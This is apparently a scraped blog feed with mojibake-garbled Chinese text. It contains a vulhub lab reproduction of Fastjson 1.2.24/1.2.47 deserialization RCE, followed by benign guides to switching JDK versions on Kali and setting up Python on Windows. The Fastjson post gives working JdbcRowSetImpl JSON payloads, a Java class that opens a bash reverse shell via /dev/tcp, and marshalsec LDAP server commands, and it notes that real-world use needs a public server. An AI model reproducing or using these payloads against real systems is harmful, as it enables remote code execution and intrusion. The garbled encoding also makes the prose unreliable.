‡è®°å…¶å­—ç¬¦çš„åŸå§‹ç±»å‹ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¯»å–è¿™ä¸ª@typeï¼Œæ¥è¯•å›¾æŠŠJSONå†…å®¹ååºåˆ—åŒ–åˆ°å¯¹è±¡ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨è¿™ä¸ªåº“çš„setteræˆ–è€…getteræ–¹æ³•ï¼Œç„¶è€Œï¼Œ@typeçš„ç±»æœ‰å¯èƒ½è¢«æ¶æ„æ„é€ ï¼Œåªéœ€è¦åˆç†æ„é€ ä¸€ä¸ªJSONï¼Œä½¿ç”¨@typeæŒ‡å®šä¸€ä¸ªæƒ³è¦çš„æ”»å‡»ç±»åº“å°±å¯ä»¥å®ç°æ”»å‡»ã€‚</p><p>å¸¸è§çš„æœ‰sunå®˜æ–¹æä¾›çš„ä¸€ä¸ªç±»com.sun.rowset.JdbcRowSetImplï¼Œå…¶ä¸­æœ‰ä¸ªdataSourceNameæ–¹æ³•æ”¯æŒä¼ å…¥ä¸€ä¸ªrmiçš„æºï¼Œåªè¦è§£æå…¶ä¸­çš„urlå°±ä¼šæ”¯æŒè¿œç¨‹è°ƒç”¨ï¼å› æ­¤æ•´ä¸ªæ¼æ´å¤ç°çš„åŸç†è¿‡ç¨‹å°±æ˜¯ï¼š</p><p>æ”»å‡»è€…ï¼ˆæˆ‘ä»¬ï¼‰è®¿é—®å­˜åœ¨fastjsonæ¼æ´çš„ç›®æ ‡é¶æœºç½‘ç«™ï¼Œé€šè¿‡burpsuiteæŠ“åŒ…æ”¹åŒ…ï¼Œä»¥jsonæ ¼å¼æ·»åŠ com.sun.rowset.JdbcRowSetImplæ¶æ„ç±»ä¿¡æ¯å‘é€ç»™ç›®æ ‡æœºã€‚<br>å­˜åœ¨æ¼æ´çš„é¶æœºå¯¹jsonååºåˆ—åŒ–æ—¶å€™ï¼Œä¼šåŠ è½½æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„æ¶æ„ä¿¡æ¯(è®¿é—®rmiæœåŠ¡å™¨)ï¼Œé¶æœºæœåŠ¡å™¨å°±ä¼šå‘rmiæœåŠ¡å™¨è¯·æ±‚å¾…æ‰§è¡Œçš„å‘½ä»¤ã€‚ä¹Ÿå°±æ˜¯é¶æœºæœåŠ¡å™¨é—®rmiæœåŠ¡å™¨ï¼Œï¼ˆé¶æœºæœåŠ¡å™¨ï¼‰éœ€è¦æ‰§è¡Œä»€ä¹ˆå‘½ä»¤å•Šï¼Ÿ<br>rmi æœåŠ¡å™¨è¯·æ±‚åŠ è½½è¿œç¨‹æœºå™¨çš„classï¼ˆè¿™ä¸ªè¿œç¨‹æœºå™¨æ˜¯æˆ‘ä»¬æ­å»ºå¥½çš„æ¶æ„ç«™ç‚¹ï¼Œæå‰å°†æ¼æ´åˆ©ç”¨çš„ä»£ç ç¼–è¯‘å¾—åˆ°.classæ–‡ä»¶ï¼Œå¹¶ä¸Šä¼ è‡³æ¶æ„ç«™ç‚¹ï¼‰ï¼Œå¾—åˆ°æ”»å‡»è€…ï¼ˆæˆ‘ä»¬ï¼‰æ„é€ å¥½çš„å‘½ä»¤ï¼ˆping dnslogæˆ–è€…åˆ›å»ºæ–‡ä»¶æˆ–è€…åå¼¹shellå•¥çš„ï¼‰<br>rmiå°†è¿œç¨‹åŠ è½½å¾—åˆ°çš„classï¼ˆæ¶æ„ä»£ç ï¼‰ï¼Œä½œä¸ºå“åº”è¿”å›ç»™é¶æœºæœåŠ¡å™¨ã€‚<br>é¶æœºæœåŠ¡å™¨æ‰§è¡Œäº†æ¶æ„ä»£ç ï¼Œè¢«æ”»å‡»è€…æˆåŠŸåˆ©ç”¨ã€‚</p><p>å¤§è‡´ç†è§£å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/573507598b3f5d8f994ed6de07fcd013.png" alt="img"></p><h2 id="é¶åœºå¤ç°">é¶åœºå¤ç°</h2><h3 id="1-2-24-rce">1.2.24-rce</h3><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>kaliæ”»å‡»æœºï¼ˆjava8ç¯å¢ƒï¼‰&amp;æœåŠ¡å™¨ï¼š192.168.192.133</p></blockquote><p>é¶æœºå¯åŠ¨ç¯å¢ƒ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331100516446.png" alt="image-20250331100516446"></p><p>è®¿é—®é¶æœºip:8090,èƒ½è®¿é—®æˆåŠŸå³æ­å»ºç¯å¢ƒæˆåŠŸã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331100927877.png" alt="image-20250331100927877"></p><h4 id="å¯»æ‰¾æ–¹å¼">å¯»æ‰¾æ–¹å¼</h4><p>å¯»æ‰¾å­˜åœ¨ Fastjson æ¼æ´çš„æ–¹æ³•ï¼Œå°±æ˜¯å…ˆæ‰¾åˆ°å‚æ•°ä¸­å†…å®¹æ˜¯ json æ•°æ®çš„æ¥å£ï¼Œç„¶åä½¿ç”¨æ„é€ å¥½çš„æµ‹è¯• payload è¿›è¡Œæäº¤éªŒè¯ï¼Œæ£€æµ‹åŸç†è·Ÿ sql æ³¨å…¥å·®ä¸å¤šï¼Œé¦–å…ˆæ‰¾åˆ°å‚æ•°æäº¤çš„åœ°æ–¹ï¼Œç„¶åå†ç”¨ payload å°è¯•ã€‚</p><p>æˆ‘ä»¬å…ˆè¿›è¡ŒæŠ“åŒ…</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331101715500.png" alt="image-20250331101715500"></p><p>æˆ‘ä»¬å…ˆå°†GETæ”¹æˆPOSTï¼Œç„¶åçœ‹å“åº”åŒ…</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331125818259.png" alt="image-20250331125818259"></p><p>æœ‰â€fastjsonâ€œçš„ä¿¡æ¯ï¼Œè¯´æ˜å­˜åœ¨æ¼æ´ã€‚</p><p>æ­¤æ—¶æˆ‘ä»¬å°†GETæ”¹æˆPOSTï¼Œæ·»åŠ Conten-Typeå­—æ®µä¸ºapplication/jsonï¼Œæ·»åŠ Content-Lenthå­—æ®µï¼Œé•¿åº¦å¯ä»¥å¤§ä¸€ç‚¹ã€‚å†æ·»åŠ è¯·æ±‚å‚æ•°ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331101918636.png" alt="image-20250331101918636"></p><p>çœ‹å“åº”åŒ…ï¼Œå·²ç»æ”¹å˜äº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331102033009.png" alt="image-20250331102033009"></p><p>äºæ˜¯æäº¤javaå¯¹è±¡è¯•è¯•ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#1.2.24:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.192.133:7788/exp&quot;,  #IDAPæœåŠ¡å™¨çš„ip:ç«¯å£/æ–‡ä»¶</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#1.2.27:</span><br><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.192.133:7788/exp&quot;,  #IDAPæœåŠ¡å™¨çš„ip:ç«¯å£/æ–‡ä»¶</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡ºç°500æŠ¥é”™</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331103206485.png" alt="image-20250331103206485"></p><h4 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h4><h5 id="â€æ–‡ä»¶æœåŠ¡å™¨-é…ç½®">â€æ–‡ä»¶æœåŠ¡å™¨&quot;é…ç½®</h5><p>é¦–å…ˆåœ¨æ”»å‡»æœºä¸Šå‡†å¤‡ä¸€ä¸ªç®€å•çš„EXPï¼Œå†™Shellé…ç½®å¥½åå¼¹åœ°å€å’Œç«¯å£(æ”¹æˆè‡ªå·±çš„æ”»å‡»æœºçš„ipå’Œç›‘å¬ç«¯å£)</p><p>EXP:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class exp &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp;/dev/tcp/192.168.192.133/6666 0&gt;&amp;1&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨javacè¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘å®Œæˆåï¼Œæœ‰ä¸ªclassæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac C:\Users\Anonymous\Desktop\exp.java</span><br></pre></td></tr></table></figure><h6 id="æ–¹æ³•ä¸€ï¼š">æ–¹æ³•ä¸€ï¼š</h6><p>é€šè¿‡phpstudyå¼€å¯ç½‘ç«™æœåŠ¡ï¼Œï¼ˆ**å¦‚æœæ˜¯æ‰“å®æˆ˜çš„è¯ï¼Œéœ€è¦ç”¨åˆ°å…¬ç½‘æœåŠ¡å™¨åšæœåŠ¡ç«¯getshellã€‚ï¼‰**ç„¶åå°†ç¼–è¯‘åçš„exp.classæ–‡ä»¶ç§»åŠ¨åˆ°wwwç›®å½•ä¸‹ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331105936651.png" alt="image-20250331105936651"></p><h6 id="æ–¹æ³•äºŒï¼š">æ–¹æ³•äºŒï¼š</h6><p>åœ¨.classæ–‡ä»¶æ‰€åœ¨ç›®å½•ç›´æ¥å¼€å¯ç»ˆç«¯ï¼Œç„¶åç”¨pythonå¼€ä¸€ä¸ªhttp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 7766  //ç«¯å£éšæ„ï¼Œè·¯å¾„æ˜¯æ–‡ä»¶çš„ä½ç½®</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331130050031.png" alt="image-20250331130050031"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331130104433.png" alt="image-20250331130104433"></p><h5 id="â€RMI-LDAPæœåŠ¡å™¨â€œè®¾ç½®-æˆ‘ç”¨çš„LDAPæœåŠ¡">â€RMI/LDAPæœåŠ¡å™¨â€œè®¾ç½®(æˆ‘ç”¨çš„LDAPæœåŠ¡)</h5><p>æ¥ä¸‹æ¥éœ€è¦ç”¨åˆ°marshalsecï¼Œå®‰è£…æ–¹æ³•ï¼š</p><blockquote><p>git clone <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a>  #è™šæ‹Ÿæœºä¸‹è½½æ…¢å¯ä»¥ç›´æ¥å»é¡¹ç›®æ‰“åŒ…ç„¶åæ‹–è¿›å»</p><p>cd marshalsec</p><p>mvn clean package -DskipTests #ç¼–è¯‘</p></blockquote><p>ç¼–è¯‘æˆåŠŸå/marshalsec/targetä¼šå‡ºç°marshalsec-0.0.3-SNAPSHOT-all.jarçš„æ–‡ä»¶ï¼Œç¼–è¯‘æ—¶é—´å¯èƒ½æœ‰ç‚¹ä¹…ï¼ˆæ³¨æ„è¦æ˜¯java8ç¯å¢ƒï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401101740455.png" alt="image-20250401101740455"></p><p>æ¥ä¸‹æ¥åœ¨æ”»å‡»kaliåˆ©ç”¨marshalsecå¼€å¯LDAPæœåŠ¡</p><p>è§£é‡Šä¸€ä¸‹è¿™é‡Œï¼Œä¸Šé¢çš„ç¯å¢ƒå·²ç»å¼€å¯äº†ä¸´æ—¶çš„ç½‘ç«™ç¯å¢ƒï¼Œç¯å¢ƒä¸‹é¢æœ‰exp.classï¼Œè¿™é‡Œå¼€å¯çš„7788ç«¯å£æ˜¯ç»™LDAPçš„ï¼Œç„¶åæŠŠè¿™ä¸ªç«¯å£å’Œ7766ç»‘å®šä¸€èµ·ï¼Œå°†LDAPæœåŠ¡ç»‘å®šåˆ°7788ç«¯å£çš„ç›®çš„æ˜¯ä¸ºäº†åœ¨7788ç«¯å£ä¸Šç›‘å¬LDAPè¯·æ±‚å¹¶å“åº”ï¼Œè€Œè¿™ä¸ªè·¯å¾„ä¸‹é¢æœ‰javaç±»æ–‡ä»¶exp.classï¼Œé€šå‘Šæ„é€ æ¶æ„çš„josnè¯·æ±‚å»æ‰§è¡Œjavaç±»æ–‡ä»¶ï¼Œè¾¾åˆ°åå¼¹shellçš„ç›®çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.192.133:7766/#exp 7788</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401113309210.png" alt="image-20250401113309210"></p><p>åŒæ—¶åˆ›å»ºç›‘å¬6666ç«¯å£ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ç¼–è¯‘åçš„exp.classæ–‡ä»¶ä¸­æŒ‡å‘æ”»å‡»æœºçš„ç«¯å£</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331103455305.png" alt="image-20250331103455305"></p><h5 id="æŠ“åŒ…Getshell">æŠ“åŒ…Getshell</h5><p>ç„¶åè®¿é—®vulhubä¸Šçš„fastjsonè¿›è¡ŒæŠ“åŒ…ï¼Œè¯·æ±‚åŒ…æ„é€ æ¶æ„josnè¯·æ±‚ä¸ºè®¿é—®æ”»å‡»æœºä¸‹çš„rmiæœåŠ¡ï¼Œè¿™é‡Œçš„Content-typeçš„ç±»å‹ä¸ä¸Šé¢ç›¸åŒæ”¹ä¸º  application/josn å‘é€POSTè¯·æ±‚ã€‚</p><p>è¯·æ±‚æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.192.133:7788/exp&quot;, #IDAPæœåŠ¡å™¨çš„ip:ç«¯å£/æ–‡ä»¶</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401113427182.png" alt="image-20250401113427182"></p><p>å¯ä»¥çœ‹åˆ°è¿”å›åŒ…å¾ˆæ…¢æˆ–è€…æ²¡æœ‰ï¼Œä½†æ˜¯çœ‹ç›‘å¬ç«¯å£å‘ç°å·²ç»è¿ä¸Šäº†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401113540791.png" alt="image-20250401113540791"></p><p>è‡³æ­¤getshellæˆåŠŸã€‚</p><h3 id="1-2-47-rce">1.2.47-rce</h3><p>åˆ©ç”¨æ­¥éª¤è·Ÿ1.2.24-rceä¸€æ ·ï¼Œåªæ˜¯æœ€åæŠ“åŒ…æ”¹åŒ…GetShellæ—¶æ¢æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.192.133:7788/exp&quot;,  #IDAPæœåŠ¡å™¨çš„ip:ç«¯å£/æ–‡ä»¶</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401151424631.png" alt="image-20250401151424631"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§ã€vulhubæ¼æ´é¶åœºã€‘fastjsonååºåˆ—åŒ–æ¼æ´åŠfastjsonååºåˆ—åŒ–æ¼æ´å¤ç°ï¼›fastjsonæ¼æ´1.2.24-rceæ¼æ´è¯¦æƒ…åŠåˆ©ç”¨ï¼›fastjsonæ¼æ´1.2.47-rceæ¼æ´åˆ©ç”¨</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>kaliç³»ç»Ÿjavaç‰ˆæœ¬ä¸‹è½½é…ç½®åŠä¸åŒç‰ˆæœ¬åˆ‡æ¢</title>
    <link href="https://blog.m3x1.cn/posts/93b636bf.html"/>
    <id>https://blog.m3x1.cn/posts/93b636bf.html</id>
    <published>2025-03-30T16:00:00.000Z</published>
    <updated>2025-04-01T02:03:47.365Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æŸ¥çœ‹å½“å‰-JDK-ç‰ˆæœ¬ä¿¡æ¯">æŸ¥çœ‹å½“å‰ JDK ç‰ˆæœ¬ä¿¡æ¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eade4c6a968f45c6b4ff221c70fbc804.png" alt="img"></p><p>å½“å‰åªæœ‰ä¸€ä¸ª17ç‰ˆæœ¬</p><h2 id="å®‰è£…-JDKç‰ˆæœ¬ï¼ˆä»¥JDK8ä¸ºä¾‹ï¼‰">å®‰è£… JDKç‰ˆæœ¬ï¼ˆä»¥JDK8ä¸ºä¾‹ï¼‰</h2><p>å®˜ç½‘ä¸‹è½½jdk8ç‰ˆæœ¬çš„Javaï¼š</p><blockquote><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c92b77df880b46e08bd3c899c119518e.png" alt="img"></p><h2 id="å°†jdkæ–‡ä»¶ç§»åŠ¨åˆ°-usr-local">å°†jdkæ–‡ä»¶ç§»åŠ¨åˆ°/usr/local/</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar  -zxf  jdk-8u212-linux-x64.tar.gz           #è§£å‹jdkæ–‡ä»¶, è¿™é‡Œæ³¨æ„ä¿®æ”¹ä½ è‡ªå·±çš„æ–‡ä»¶åç§°</span><br><span class="line">mv  jdk1.8.0_212  /usr/local/                       #å°†è§£å‹å¥½çš„æ–‡ä»¶ç§»åŠ¨åˆ°localç›®å½•</span><br></pre></td></tr></table></figure><h2 id="é…ç½®ç¯å¢ƒå˜é‡">é…ç½®ç¯å¢ƒå˜é‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶æœ«å°¾åŠ ä¸Šä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/jdk1.8.0_212</span><br><span class="line">PATH=$PATH:$HOME/bin:$JAVA_HOME/bin</span><br><span class="line">export JAVA_HOME</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a2e08b71bc77422abb18893f93f7b0d3.png" alt="img"></p><h2 id="æ³¨å†Œå®‰è£…jdk8">æ³¨å†Œå®‰è£…jdk8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#å®‰è£…å¹¶æ³¨å†Œ</span><br><span class="line">update-alternatives --install /usr/bin/java java /usr/local/jdk1.8.0_212/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /usr/local/jdk1.8.0_212/bin/javac 1</span><br><span class="line">update-alternatives --set java /usr/local/jdk1.8.0_212/bin/java</span><br><span class="line">update-alternatives --set javac /usr/local/jdk1.8.0_212/bin/javac</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/649caa57c5d14755b86c8c8f1ada0cdf.png" alt="img"></p><p>æ£€æŸ¥æ˜¯å¦æˆåŠŸé…ç½®Javaç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5b61d5de419c47c8b0e7eb6db1acad75.png" alt="img"></p><h2 id="åˆ‡æ¢ç‰ˆæœ¬">åˆ‡æ¢ç‰ˆæœ¬</h2><p>é€šè¿‡ä»¥ä¸‹æ“ä½œè¿›è¡Œç‰ˆæœ¬åˆ‡æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f26f11c423d74213b5fffee2407cc172.png" alt="img"></p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/m0_63082628/article/details/140192833">kalié…ç½®å¤šç‰ˆæœ¬jdkå¹¶è‡ªç”±åˆ‡æ¢_kaliåˆ‡æ¢jdkç‰ˆæœ¬-CSDNåšå®¢</a></p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§kaliç³»ç»Ÿjavaç‰ˆæœ¬ä¸‹è½½é…ç½®åŠåˆ‡æ¢ï¼›kalié…ç½®java8ï¼›kaliæœºjavaä¸åŒç‰ˆæœ¬åˆ‡æ¢</summary>
    
    
    
    <category term="å…¶ä»–å­¦ä¹ ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="å…¶ä»–å­¦ä¹ ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>win10ç³»ç»Ÿé…ç½®python2å’Œpython3å…±å­˜ä»¥åŠé…ç½®pip</title>
    <link href="https://blog.m3x1.cn/posts/6c2a0a85.html"/>
    <id>https://blog.m3x1.cn/posts/6c2a0a85.html</id>
    <published>2025-03-29T16:00:00.000Z</published>
    <updated>2025-03-30T14:56:24.135Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="é…ç½®python2å’Œpython3">é…ç½®python2å’Œpython3</h2><p>é¦–å…ˆï¼Œå»Pythonå®˜ç½‘<strong>æ‰¾åˆ°Python2å’Œ3ç‰ˆæœ¬å¯¹åº”çš„å®‰è£…åŒ…ä¸‹è½½</strong></p><p>ä¸‹é¢æ˜¯python2å’Œ3çš„ä¸‹è½½åœ°å€ ï¼š<a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210722220714087-1009299070.png" alt="img"></p><p>åœ¨Eç›˜ä¸‹å»ºç«‹ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ†åˆ«ä¸ºpython2å’Œpython3ï¼Œæ ¹æ®è‡ªå·±çš„æƒ…å†µå¯ä»¥æ”¹åŠ¨ï¼Œä¸¤è€…åœ¨ä¸€å—å¹¶åˆ—æ›´æ–¹ä¾¿ä»¥åå®‰è£…å’Œè°ƒæ•´ç¯å¢ƒå˜é‡ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724184253195-363962755.png" alt="img"></p><p>æ¥ä¸‹æ¥ï¼Œå°±æ˜¯<strong>åˆ†åˆ«å¯¹Python2å’Œ3çš„å®‰è£…åŒ…è¿›è¡Œå®‰è£…</strong></p><h3 id="å®‰è£…Python3">å®‰è£…Python3</h3><p>åœ¨é€‰æ‹©è·¯å¾„å®‰è£…æ—¶ï¼Œè®°å¾—æŠŠä¸‹æ–¹çš„â€œAdd Python  3.6  toPATHâ€å‹¾é€‰ä¸Šï¼Œè¿™æ ·å°±ä¸ç”¨æ‰‹åŠ¨é…ç½®ç¯å¢ƒå˜é‡äº†ï¼Œåç»­ä¸ç”¨å†æ·»åŠ ç¯å¢ƒå˜é‡ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210722221118419-867488911.png" alt="img"></p><p>è‡ªå®šä¹‰å°½é‡ä¸è£…cç›˜</p><p>å®Œäº‹ä¸‹ä¸€æ­¥ï¼Œåˆ°å¦‚ä¸‹å›¾ä½ç½®ï¼Œå…¨éƒ¨é»˜è®¤é€‰æ‹©å³å¯ï¼Œå®‰è£…åœ¨ä¸Šé¢å»ºç«‹çš„python3æ–‡ä»¶å¤¹ä¸‹ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210722222147052-1345469882.png" alt="img"></p><p>å®‰è£…æˆåŠŸåï¼Œcmdæ§åˆ¶å°è¾“å…¥pythonï¼ŒæŸ¥çœ‹æ˜¯å¦æˆåŠŸã€‚å‡ºç°ä¸‹é¢è¯æ˜å®‰è£…æˆåŠŸã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724181755309-1235964516.png" alt="img"></p><h3 id="å®‰è£…Python2">å®‰è£…Python2</h3><p>all user æ˜¯ä¾›ä½¿ç”¨è¿™å°ç”µè„‘çš„æ‰€æœ‰ç”¨æˆ·ä½¿ç”¨ï¼Œæ˜¯æƒé™é—®é¢˜ã€‚just for meæ˜¯è¯´åªä¾›å½“å‰ç”¨æˆ·ä½¿ç”¨ã€‚<br>å¦‚æœä½ çš„ç”µè„‘ä¸Šåªæœ‰å»ºäº†ä¸€ä¸ªç”¨æˆ·ï¼Œall userså’Œjust me çš„ä½œç”¨æ˜¯ä¸€æ 